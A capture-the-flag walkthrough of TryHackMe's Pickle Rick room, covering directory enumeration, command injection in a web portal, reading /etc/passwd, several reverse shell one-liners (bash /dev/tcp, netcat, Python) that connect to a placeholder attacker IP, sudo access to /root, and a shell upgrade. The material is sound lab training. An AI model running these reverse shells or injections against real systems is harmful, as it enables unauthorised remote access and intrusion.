🥒 TryHackMe - Pickle Rick CTF Walkthrough
https://img.shields.io/badge/TryHackMe-Pickle%2520Rick-red
https://img.shields.io/badge/Difficulty-Easy-green
https://img.shields.io/badge/Category-CTF-blue
https://img.shields.io/badge/OS-Linux-orange

Solved By: Prince 👑
Date: 2025-10-07
Platform: TryHackMe

📋 Table of Contents
Executive Summary

Attack Flow

Reconnaissance

Directory Enumeration

Initial Access

Reverse Shell

Privilege Escalation

TTY Shell Upgrade

Completion Summary

🎯 Executive Summary
This CTF walkthrough demonstrates a complete web application penetration test on the Pickle Rick machine. The engagement involved reconnaissance, directory brute-forcing, command injection, reverse shell establishment, and privilege escalation to recover three secret ingredients.

🔍 Attack Flow Overview
graph TD
    A[Reconnaissance] --> B[Directory Brute Force]
    B --> C[Clue Discovery]
    C --> D[Command Injection]
    D --> E[Reverse Shell]
    E --> F[Flag Hunting]
    F --> G[Privilege Escalation]
    G --> H[All Ingredients Recovered]
    🕵️ Reconnaissance
Step 1: Manual Browsing
Visited target URL http://MACHINE-IP

Analyzed page source for hidden hints

Discovered potential usernames and clues

Step 2: Directory Brute Force
Used Gobuster for comprehensive directory enumeration:

bash
gobuster dir -u http://MACHINE-IP -w ./wordlists/common.txt -x .txt,.php,.html -t 50
Parameters Explained:

-w: Wordlist path

-x: File extensions to search

-t: Threads for faster scanning

Step 3: Automated URL Testing (PowerShell)
Created PowerShell script for quick endpoint verification:

powershell
param ([string]$Url)
$paths = @("robots.txt", "clue.txt", "admin", "login.php")
foreach ($path in $paths) {
    $target = "$Url/$path"
    try {
        $res = Invoke-WebRequest -Uri $target -UseBasicParsing -ErrorAction Stop
        if ($res.StatusCode -eq 200) {
            Write-Host "$path exists!" -ForegroundColor Green
        }
    } catch {
        Write-Host "$path not found." -ForegroundColor DarkGray
    }
}
Execution:

powershell
.\Test-URLs.ps1 -Url http://MACHINE-IP/
📊 Scan Results:

text
/index.html           (Status: 200)
/login.php            (Status: 200)
/portal.php           (Status: 302)
/robots.txt           (Status: 200)
robots.txt exists!
clue.txt exists!
login.php exists!
🔎 Clue Investigation
Discovered Files:
robots.txt: Contained Wubbalubbadubdub

clue.txt: Provided additional hints

login.php: Authentication portal

🚪 Initial Access
Command Injection Testing
Once logged into portal.php, tested command execution:

Basic Commands:

bash
ls
whoami
Chained Commands:

bash
ls; whoami
cat /etc/passwd
🐚 Getting a Reverse Shell
Step 1: Listener Setup (Windows)
powershell
ncat.exe -lvnp 4444
Step 2: Reverse Shell Payloads
Bash Reverse Shell:

bash
bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
URL Encoded Version:

bash
bash%20-i%20%3E%26%20/dev/tcp/YOUR-IP/4444%200%3E%261
Netcat Alternative:

bash
nc YOUR-IP 4444 -e /bin/bash
Python Reverse Shell:

python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash"])'
Step 3: Successful Connection
powershell
PS C:\Temp> ncat.exe -lvnp 4444
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from MACHINE-IP:PORT.
🔍 Privilege Escalation & Flag Hunting
Shell Stabilization
bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ingredient 1 Discovery
bash
www-data@ip-10-10-81-100:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt
Ingredient 2 Discovery
bash
www-data@ip-10-10-81-100:/var/www/html$ cd /home/rick
www-data@ip-10-10-81-100:/home/rick$ ls -la
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019  .
drwxr-xr-x 4 root root 4096 Feb 10  2019  ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 'second ingredients'
www-data@ip-10-10-81-100:/home/rick$ cat "second ingredients"
1 ????? ????
Ingredient 3 Discovery
bash
www-data@ip-10-10-81-100:/home/rick$ cd /
www-data@ip-10-10-81-100:/$ sudo ls -la /root
total 36
drwx------  4 root root 4096 Jul 11  2024 .
drwxr-xr-x 23 root root 4096 Apr 21 13:30 ..
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
www-data@ip-10-10-81-100:/$ sudo cat /root/3rd.txt
3rd ingredients: ????? ?????
⚡ Bonus: Upgrade to Full TTY
Shell Enhancement Process
bash
# Inside reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Press CTRL-Z

# In your terminal
stty raw -echo; fg

# Press Enter, then:
export TERM=xterm
clear
Benefits of TTY Upgrade:

✅ Tab completion

✅ CTRL+C functionality

✅ Better prompt

✅ Improved shell experience

🏆 Completion Summary
Skills Practiced:
✅ Manual & automated reconnaissance

✅ HTML source code analysis

✅ Directory brute-forcing

✅ Web command injection

✅ Reverse shell establishment

✅ Linux privilege escalation

✅ File system enumeration

Ingredients Recovered:
First Ingredient: Found in web directory

Second Ingredient: Located in /home/rick

Third Ingredient: Secured in /root directory

